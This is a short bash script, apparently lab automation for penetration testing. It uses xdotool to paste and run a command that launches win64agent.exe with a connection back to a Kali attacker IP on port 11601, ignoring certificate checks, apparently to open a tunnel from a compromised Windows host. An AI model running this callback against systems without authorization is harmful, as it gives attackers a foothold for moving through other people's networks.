#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "./win64agent.exe -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return